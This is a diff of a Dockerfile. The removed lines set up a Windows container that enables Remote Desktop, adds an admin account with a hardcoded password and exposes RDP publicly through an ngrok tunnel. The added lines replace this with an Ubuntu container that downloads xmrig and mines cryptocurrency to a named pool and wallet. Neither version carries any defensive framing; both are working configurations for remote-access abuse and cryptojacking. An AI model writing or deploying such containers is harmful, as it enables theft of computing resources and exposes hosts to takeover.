@@ -1,27 +1,17 @@
-# Use the latest Windows Server Core image
-FROM mcr.microsoft.com/windows/servercore:ltsc2019
+# Use a base image
+FROM ubuntu:latest
 
-# Set the working directory
-WORKDIR /app
+# Update package lists and install necessary packages
+RUN apt-get update && apt-get install -y curl tar
 
-# Download and extract ngrok
-RUN Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip && \
-    Expand-Archive ngrok.zip
+# Download xmrig
+RUN curl -LO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
 
-# Set ngrok authtoken
-ARG NGROK_AUTH_TOKEN
-RUN .\ngrok\ngrok.exe authtoken $NGROK_AUTH_TOKEN
+# Extract xmrig
+RUN tar -xf xmrig-6.21.0-linux-x64.tar.gz
 
-# Enable Remote Desktop
-RUN Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 && \
-    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" && \
-    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
+# Change directory to xmrig-6.21.0
+WORKDIR /xmrig-6.21.0
 
-# Set password for runneradmin
-RUN net user runneradmin P@ssw0rd! /add
-
-# Expose port 3389 for Remote Desktop
-EXPOSE 3389
-
-# Start ngrok tunnel
-CMD .\ngrok\ngrok.exe tcp 3389
+# Run xmrig with the specified parameters
+CMD ["./xmrig", "-o", "rx.unmineable.com:3333", "-a", "rx", "-k", "-u", "PEPE:0x0f426b09bff0b791e60babc7adb05e7cf61aa834.WORKERNAME", "-p", "x"]
